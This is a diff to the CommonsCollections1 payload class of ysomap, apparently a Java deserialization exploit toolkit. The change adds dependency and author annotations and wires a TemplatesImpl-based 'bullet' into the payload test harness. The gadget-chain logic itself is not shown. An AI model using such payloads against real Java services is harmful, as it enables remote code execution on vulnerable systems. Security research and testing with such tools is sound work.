@@ -5,6 +5,10 @@ import org.apache.commons.collections.functors.ChainedTransformer;
 import org.apache.commons.collections.functors.ConstantTransformer;
 import org.apache.commons.collections.map.LazyMap;
 import ysomap.PayloadTester;
+import ysomap.annotation.Authors;
+import ysomap.annotation.Dependencies;
+import ysomap.gadget.ObjectGadget;
+import ysomap.gadget.bullet.collections.TransformerWithTemplatesImplBullet;
 import ysomap.gadget.payload.Payload;
 import ysomap.util.PayloadHelper;
 import ysomap.util.Reflections;
@@ -14,10 +18,13 @@ import java.util.HashMap;
 import java.util.Map;
 
 /**
+ * CommonsCollections3 也可以用这个
  * @author wh1t3P1g
  * @since 2020/2/17
  */
+@Authors({ Authors.FROHOFF })
 @SuppressWarnings({"rawtypes"})
+@Dependencies({"commons-collections:commons-collections:3.2.1","jdk7"})
 public class CommonsCollections1 extends Payload<InvocationHandler> {
 
     @Override
@@ -44,6 +51,10 @@ public class CommonsCollections1 extends Payload<InvocationHandler> {
     }
 
     public static void main(String[] args) {
-        new PayloadTester(CommonsCollections1.class).run();
+        ObjectGadget bullet = new TransformerWithTemplatesImplBullet(null,3);
+//        new PayloadTester(CommonsCollections1.class).run();// CommonsCollections1
+        new PayloadTester(CommonsCollections1.class)
+                .setBullet(bullet)
+                .run();
     }
 }
